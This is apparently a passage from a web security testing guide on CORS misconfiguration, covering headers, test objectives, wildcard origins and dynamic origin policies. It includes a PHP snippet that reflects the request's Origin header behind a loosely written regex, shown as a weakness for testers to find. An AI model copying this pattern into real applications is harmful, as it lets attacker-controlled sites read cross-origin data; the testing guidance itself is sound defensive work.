      <p>XHR L2 introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.</p>
      <h3 id="other-headers">Other Headers</h3>
      <p>There are other headers involved like <code class="language-plaintext highlighter-rouge">Access-Control-Max-Age</code> that determines the time a preflight request can be cached in the browser, or <code class="language-plaintext highlighter-rouge">Access-Control-Expose-Headers</code> that indicates which headers are safe to expose to the API of a CORS API specification.</p>
      <p>To review CORS headers, refer to the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers">CORS MDN document</a>.</p>
      <h2 id="test-objectives">Test Objectives</h2>
      <ul>
      <li>Identify endpoints that implement CORS.</li>
      <li>Ensure that the CORS configuration is secure or harmless.</li>
      </ul>
      <h2 id="how-to-test">How to Test</h2>
      <p>A tool such as <a href="https://www.zaproxy.org">ZAP</a> can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, in some cases, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input.</p>

      <p>Setting the wildcard to the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin header</code> (that is, <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin: *</code>) is not secure if the response contains sensitive information. Although it cannot be used with the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials: true</code> at the same time, it can be dangerous where the access control is done solely by the firewall rules or the source IP addresses, other than being protected by credentials.</p>

      <h4 id="dynamic-cors-policy">Dynamic CORS Policy</h4>
      <p>A modern web application or API may be implemented to allow cross-origin requests dynamically, generally in order to allow the requests from the sub domains like the following:</p>
      <div class="language-php highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'|\.example.com$|'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">]))</span> <span class="p">{</span>
         <span class="nb">header</span><span class="p">(</span><span class="s2">"Access-Control-Allow-Origin: </span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_ORIGIN'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>

      <span class="p">}</span>
      </code></pre>
      </div>
      </div>
      <p>In this example, all the requests from the subdomains of example.com will be allowed. It must be ensured that the regular expression that is used to match is complete. Otherwise, if it was simply matched with <code class="language-plaintext highlighter-rouge">example.com</code> (without <code class="language-plaintext highlighter-rouge">$</code> appended), attackers might be able to bypass the CORS policy by appending their domain to the <code class="language-plaintext highlighter-rouge">Origin</code> header.</p>
